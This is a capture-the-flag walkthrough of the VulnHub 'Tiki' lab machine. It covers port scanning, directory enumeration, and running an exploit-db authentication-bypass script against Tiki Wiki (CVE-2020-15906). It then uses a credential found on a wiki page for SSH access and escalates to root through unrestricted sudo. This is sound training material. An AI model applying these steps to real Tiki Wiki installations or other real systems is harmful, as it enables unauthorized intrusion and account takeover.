# Tiki | VulnHub
https://www.vulnhub.com/entry/tiki-1,525/

### 1. Scan
```bash
Nmap scan report for 192.168.34.151
Host is up, received arp-response (0.00084s latency).
Scanned at 2021-07-16 00:50:16 EDT for 21s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:d8:4a:89:a9:25:6d:07:c5:3d:76:28:06:ed:d1:c0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0QOr55x/Sj6hKeR3ArLyVAPS5kzyAx8e3V2S9W44G2+SxkJ3lNn4WKgUwER8Rv3Dt1dmXfuQHXpRb7Fb9S4DoOh5kpY1PJLnvSyoe/w22YZthgar6Jf6q3XwoPFiaF9JBEJqsG0pFGFRccccasTgtCsT/2wE15L2To+WU6wPyZt2F6vOSC+yhVGOX9P0lnSbO6+1ZFIMKLDtAQU/o++PBap87c12voIkQjzC6Nyk0EVp36NKc6AIlRhAU/RIMic8ETT+f4AAiHOxoBdATL/gJcJXXyBdlWQcZe8kw26zG2kjFrcRQBM+Zj/z91H22dCQjJXmUIRIAhiVdZvL4UG4GPLigGGqAvs7ggnIw1FrQ92diFGz0ksrQfzGvXRwZqLngjdJJMuC+8lps5GZVOevYd5bQR44BLZlZXx69kagOydRMfSKw1RuZViBIDft7KZg2f9ZLlATAIYLx6+xDexE8zKvP/eyNZWELnTbQH2StPXP12tJnSNb9Jea3dXYB4Ds=
|   256 e7:b2:89:05:54:57:dc:02:f4:8c:3a:7c:55:8b:51:aa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCxghOMMgnGuE/gI+7mtcnam8ybjFNjkCsoFqkD/CRe2wWtddrl6EWKDAit3QQ9GbY8WJ4EGrJiJQogW5b7c7is=
|   256 fd:77:07:2b:4a:16:3a:01:6b:e0:00:0c:0a:36:d8:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILaaZ/QfOgCnog0JIRtlGUoXO3Ph+bxbcGBMBXo8w4Bz
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
| http-robots.txt: 1 disallowed entry 
|_/tiki/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
MAC Address: 00:0C:29:5F:A3:83 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/16%OT=22%CT=1%CU=41562%PV=Y%DS=1%DC=D%G=Y%M=000C29%T
OS:M=60F1101D%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6
OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Uptime guess: 30.625 days (since Tue Jun 15 09:50:25 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The machine is running SSH and an Apache server.

### 2. Enumeration
Ran a dirsearch on the web root.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ dirsearch -u http://192.168.34.151 -x 403 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Error Log: /home/kali/Extra-Tools/dirsearch/logs/errors-21-07-16_00-52-55.log

Target: http://192.168.34.151/

Output File: /home/kali/Extra-Tools/dirsearch/reports/192.168.34.151/_21-07-16_00-52-55.txt

[00:52:55] Starting: 
[00:53:12] 200 -   11KB - /index.html
[00:53:17] 200 -   42B  - /robots.txt                                                                   
[00:53:20] 200 -  526B  - /tiki/doc/stable.version                                                                
                                                                                                
Task Completed
```
Looking at /tiki, this is an instance of Tiki Wiki CMS Groupware, with the default homepage. Next step is to find the version, which looks to be in the stable.version file. Scrolling to the bottom of the file, the last recent stable version number is 20.1.

### 3. Bypass authentication
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ searchsploit tiki cms
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Tiki Wiki CMS 15.0 - Arbitrary File Download                         | php/webapps/40080.txt
Tiki Wiki CMS Calendar 6.15/9.11 LTS/12.5 LTS/14.2 - Remote Code Exe | php/webapps/39965.txt
Tiki Wiki CMS Groupware - 'url' Open Redirection                     | php/webapps/36848.txt
Tiki Wiki CMS Groupware 21.1 - Authentication Bypass                 | php/webapps/48927.py
Tiki Wiki CMS Groupware 5.2 - Multiple Vulnerabilities               | php/webapps/15174.txt
Tiki Wiki CMS Groupware 7.2 - 'snarf_ajax.php' Cross-Site Scripting  | php/webapps/35974.txt
Tiki Wiki CMS Groupware 8.1 - 'show_errors' HTML Injection           | php/webapps/36470.txt
Tiki Wiki CMS Groupware 8.2 - 'snarf_ajax.php' Remote PHP Code Injec | php/webapps/18265.txt
Tiki Wiki CMS Groupware 8.3 - 'Unserialize()' PHP Code Execution     | php/webapps/19573.php
Tiki Wiki CMS Groupware 8.3 - 'Unserialize()' PHP Code Execution (Me | php/webapps/19630.rb
--------------------------------------------------------------------- ---------------------------------
```
There is a single exploit in exploitdb for auth bypass.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ searchsploit -m 48927
  Exploit: Tiki Wiki CMS Groupware 21.1 - Authentication Bypass
      URL: https://www.exploit-db.com/exploits/48927
     Path: /usr/share/exploitdb/exploits/php/webapps/48927.py
File Type: UTF-8 Unicode text, with CRLF line terminators

Copied to: /home/kali/Desktop/48927.py

┌──(kali㉿kali)-[]-[~/Desktop]
└─$ mv 48927.py exploit.py

┌──(kali㉿kali)-[]-[~/Desktop]
└─$ python3 exploit.py 192.168.34.151
Admin Password got removed.
Use BurpSuite to login into admin without a password
```

Fire up Burp, log in to Wiki with "admin" and a garbage password which is removed by intercepting the request. This results in access to the Tiki admin panel.

### 4. Explore the wiki pages
There are a few wiki pages that can be seen as the admin user:
1. "Credentials" with the content: `silky:Agy8Y7SPJNXQzqA`.
2. "Silky's Homepage" with the content:
```
This is my third CTF. Dont give up, there is always a way to root!

I like Cats, Frogs, Snakes and cute Doggos but thats not helpful isnt it?
Hmmm maybe you like something different, ... You like Hacking right?
I got a new CVE Number: But I constantly forget its ID :/ 
```
This page also has some versions in it's history.
By looking back at the history of this page, the CVE can be recovered:
```
i recently got a new CVE Number: CVE-2020-15906. 
```
Turns out this is actually just the authentication bypass that was already used, so ignore that. Let's use the creds.

### 5. Get a shell
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ssh silky@192.168.34.151                                                                     255 ⨯
The authenticity of host '192.168.34.151 (192.168.34.151)' can't be established.
ECDSA key fingerprint is SHA256:ApBZdsEv9OD5yRa5A+VVFRKVtbxaYr9uOaoHXDfOOtQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.34.151' (ECDSA) to the list of known hosts.
silky@192.168.34.151's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


1 Aktualisierung kann sofort installiert werden.
0 dieser Aktualisierung sind Sicherheitsaktualisierungen.
Um zu sehen, wie diese zusätzlichen Updates ausgeführt werden: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Fri Jul 31 09:50:24 2020 from 192.168.56.1
silky@ubuntu:~$ id
uid=1000(silky) gid=1000(silky) Gruppen=1000(silky),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
```

### 6. Emumerate from user
Check sudo permissions..
```bash
silky@ubuntu:~$ sudo -l
[sudo] Passwort für silky: 
Passende Defaults-Einträge für silky auf ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

Der Benutzer silky darf die folgenden Befehle auf ubuntu ausführen:
    (ALL : ALL) ALL
```
This user can run anything as root.

### 7. Escalate to root
```bash
silky@ubuntu:~$ sudo -i
root@ubuntu:~# whoami
root
```